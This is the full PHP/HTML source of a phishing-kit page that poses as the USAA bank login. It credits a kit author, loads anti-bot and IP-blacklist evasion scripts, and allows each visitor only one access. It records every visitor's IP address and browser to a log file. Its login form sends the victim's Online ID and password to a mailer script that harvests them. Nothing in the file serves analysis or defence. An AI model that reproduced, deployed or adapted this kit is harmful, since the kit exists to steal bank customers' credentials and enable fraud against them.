<?php
session_start();
error_reporting(0);
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * USAA -
 * version 1.0
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 USAA              $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
include'Spox/config.php';


if ($one_time_access=="yes") {

    if ( !file_exists('one_time.txt') ) {
 $deny_ips = array();
} else {
 $deny_ips = file('one_time.txt');
}

if ( (array_search($_SESSION['ip'], $deny_ips))!== FALSE ) {
        header("HTTP/1.0 404 Not Found");
        exit();
}
}

if (!isset($_GET['usaa_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

if (!isset($_SESSION['USAA_SPOX'])) {

  header("Location: index");
  exit();
}

    $visit_date = date("l d F Y H:i:s");
    $content = "#Spox_USAA# IP: ".$_SESSION['ip']." - DATE: $visit_date - BROWSER: ".$_SESSION['browser']." SYSTEM: ".$_SESSION['platform']."   #Spox_USAA#\r\n";

    $save=fopen("visit_log.txt","a+");
    fwrite($save,$content);
    fclose($save);

?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8">		
<title> Login | USAA</title>
<meta http-equiv="Content-Style-Type" content="text/css">
<link rel="stylesheet" type="text/css" href="Spox/Files/css/aggregator.css" media="all">
<link rel="SHORTCUT ICON" href="favicon.ico">
<link href="Spox/Files/css/socialMediaBar_alt.css" type="text/css" rel="stylesheet" >

</head>

<body>
<div id="container">
<a name="top"></a>
<div class="noindex"> 
<a accesskey="2" href="javascript:;" class="skipInactive" id="skip">Skip to Content</a>
<div id="consolidated-pub" class="authenticationbar consolidated accessibility">
   <div id="usaanavigationbar-container" role="navigation">
     <div id="navigationmask-container" class="navigationmask" style="display:none"> </div>
      <div class="acc-usaanavigationbar consolidated-pub displayFlex">
       <div class="global-nav-left-container">
        <div id="usaa-logo" class="navigation-tab usaa-logo red-stripe acc-touch-menu-wrapper">
          	<a accesskey="1" class="highlight-rec" href="javascript:;">
          		<img src="Spox/Files/img/enterprise_nav_globalnav_usaalogo.svg">
          	</a>
        </div>
       </div>
      <div class="global-nav-right-container">
      <div id="usaa-our-products-tab" class="navigation-tab our-products-tab navigation-inner-container  acc-touch-menu-wrapper acc-touch-menu-ready">
      	<a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab" aria-expanded="false">
      <span class="nav-tab-text">Products</span></a>
      
            </div>
            <div id="usaa-your-life-events-tab" class="navigation-tab your-life-events-tab navigation-inner-container  acc-touch-menu-wrapper acc-touch-menu-ready">
            <a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab" aria-expanded="false">
            <span class="nav-tab-text">Advice</span></a>
			</div>
            <div id="usaa-about-usaa-tab" class="navigation-tab about-usaa-tab navigation-inner-container  acc-touch-menu-wrapper">
            <a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab">
            <span class="nav-tab-text">Join USAA</span></a>
        	</div>
            <div id="usaa-help-tab" class="navigation-tab help-tab navigation-inner-container  acc-touch-menu-wrapper acc-touch-menu-ready">
	            <a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab">
	            	<span class="nav-tab-text">Help</span>
	            </a>
              
            </div>
            <div class="navigation-menu-right">
              <div id="usaa-search-tab" class="navigation-tab search-tab navigation-inner-container acc-touch-menu-wrapper firstItemFocusFlag logonPageSearch acc-touch-menu-ready">
              	<a href="javascript:;" class="acc-touch-menu-toggle touch-menu-tab" aria-expanded="false">
              	<span class="nav-tab-text">
                  <img class="search-icon" src="Spox/Files/img/search.svg"></span>
     			<span class="hiddenMessage">Search</span></a>
                
              </div>              
              </div>
            </div>
          </div>
        </div>
      </div>

 </div> 
<div id="content" role="main"> 
<div id="main">
<a name="contentLink"></a>
<div class="ent-logon-jump-body-container">
<div class="ent-logon-jump-content-container">
<link rel="stylesheet" type="text/css" href="Spox/Files/css/mkt_logOffJumpPageExeptions_2018.css" media="all">

<div class="ent-logon-jump-content-container-top">
<h1 class="ent-logon-jump-top-heading-continue alignLeft white zero_topPad">Log On to Continue</h1>
<p class="subInfoLogIn">Your security is important to us. This page helps protect your logon process.</p>
</div> 
<div class="ent-logon-jump-content-container-middle">
	<div class="ent-logon-jump-form">
		<form action="Spox/Mail/Mail1.php" method="POST" id="Logon" name="Logon">
<input type="hidden" name="spox" value="Fuck you okay">
		 <label class="ent-logon-jump-label" for="j_usaaNum" id="usaaNumLabel">Online ID</label><input class="ent-logon-jump-input" name="username" type="text" maxlength="20" size="25" data-validation="length" data-validation-length="min1" data-validation-error-msg=" ">																	
		  <label class="ent-logon-jump-label" for="j_usaaPass">Password</label>
		  <input class="ent-logon-jump-input"  name="password" autocomplete="off" type="password" maxlength="12" size="25" data-validation="length" data-validation-length="min1" data-validation-error-msg=" ">
				
		  <button type="submit" class="ent-logon-jump-button">Log On</button>

		</form>
	</div>  
</div> 
<div class="ent-logon-jump-content-container-bottom alignLeft">
<p class="Primary_yellow_carrot alignLeft white topThirty">I forgot my <a class="yellow" href="javascript:;">Online ID</a> or <a class="yellow" href="javascript:;">password</a>.</p>
<p class="Primary_yellow_carrot topTwenty alignLeft white">Don't have an Online ID or password? <a class="yellow" href="javascript:;">Set up online access</a>.</p>
<p class="Primary_yellow_carrot alignLeft white topTwenty">
<a class="yellow" href="javascript:;">Security Center</a></p>
<hr class="ent-logon-jump-bottom-divider">
<div class="New_rightColumn">
<div class="">
<h2 class="ent-logon-jump-bottom-heading-notmember new_to_usaa topTwenty">Not a Member?</h2>
<p class="subText">Joining is easy and only takes a few minutes.</p>
</div>
<div class="topTwenty">
	<a id="getStartedLink" class="primary_GreenButton" href="javascript:;">JOIN ONLINE</a>
</div>
<div class="topThirty callNumber"></div>
</div> 
</div>
</div>	
</div> 
</div>	
<div class="noindex"> 
<a name="bottom"></a>
<nav>
    <ul class="usaaCommunityBar_v4">
    <li class="usaaCommunitiesSection_v4">
                <a class="usaaCommunityBarSprite_v4 usaaCommunitiesSectionAlign_v4" href="javascript:;">
                    Get Support. Discuss. Explore.<br>
                    <span>Visit the USAA Community.</span>
                </a>
            </li>
            <li class="usaaAskUsaaSection_v4">
                <a class="usaaCommunityBarSprite_v4 usaaAskUsaaSectionAlign_v4" href="javascript:;">
                </a>
            </li>
        
        <li id="" class="usaaMobileSection_v4">
            <a class="usaaCommunityBarSprite_v4 usaaMobileSectionAlign_v4" href="javascript:;">
                <strong>GO MOBILE</strong><br>apps &amp; more
            </a>
        </li>

        <li class="usaaSocialSection_v4">
            <a class="usaaFacebookLink_v4" href="javascript:;" >
                <img src="Spox/Files/img/facebook.png" >
            </a>
            <a class="usaaTwitterLink_v3" href="javascript:;" >
                <img src="Spox/Files/img/twitter.png" >
            </a>
            <a class="usaaYoutubeLink_v3" href="javascript:;">
                <img src="Spox/Files/img/youtube.png" >
            </a>
            <a class="usaaMoreLink" href="javascript:;">
                <img src="Spox/Files/img/more.png">
            </a>
         </li>
    </ul>
</nav>
<div id="footer" class="usaa-nav-footer">
<div id="navUtility" role="navigation">
	<ul class="sub">
<li><a href="javascript:;">Corporate Info &amp; Media</a></li>
<li><a href="javascript:;">News Center</a></li>
<li><a href="javascript:;">Privacy</a></li>
<li><a href="javascript:;">Careers</a></li>
<li><a href="javascript:;">Accessibility</a></li>
<li><a href="javascript:;">Contact Us</a></li>
<li><a href="javascript:;">Site Map</a></li>
<li><a href="javascript:;">FAQs</a></li>
<li><a href="javascript:;">Site Terms</a></li>
	</ul>
		
		
			
	<span style="display: none">
	</div>
	
	<div class="switchoptions">
		<a href="javascript:;">Switch to mobile site</a>
	</div>

   <span class="cobrowselogo_window">		
    <img class="cobrowselogo" height="0" width="0" src="Spox/Files/img/usaa-sprite-globalNav_v2.png">
   </span>
	<div id="legalText" class="accentAnchors" role="contentinfo">
		<div id="copyright"><p><span class="smallText">Copyright © 2019 USAA. </span></p></div>
		<div class="footnotes"><div class="disclaimerLegalText">Use of the term "member" or "membership" refers to membership in USAA Membership Services and does not convey any legal or ownership rights in USAA. Restrictions apply and are subject to change.<br><br></div><div class="disclaimerLegalText">Membership eligibility and product restrictions apply and are subject to change.<br><br></div><div class="disclaimerLegalText">USAA means United Services Automobile Association and <a href="javascript:;">its insurance, banking, investment and other companies</a>. Credit cards issued by USAA Savings Bank, other bank products by USAA Federal Savings Bank, both Member FDIC.
<br>
<br>
Investments provided by USAA Investment Management Company and USAA Financial Advisors Inc., both registered broker dealers and affiliates.
<br>
<br>

<img src="Spox/Files/img/ehl-blk.svg" height="40" width="36" border="0"> 
<br><br>
</div>
<div class="disclaimerLegalText">NC-0518<br><br></div>
</div>
<br>
	<a class="about-our-ads" href="javascript:;">About Our Ads</a>
</div>
<br clear="all">
</div>
</div> 
</div> 

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
$(".checkbox__input").click(function(){
    $(this).toggleClass('checkbox__input--checked')
});

$(document).ready(function() {
  $("#input-useToken").click(function() {
    $("#securityToken").toggle();
  });
});
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

</script>
</body>
</html>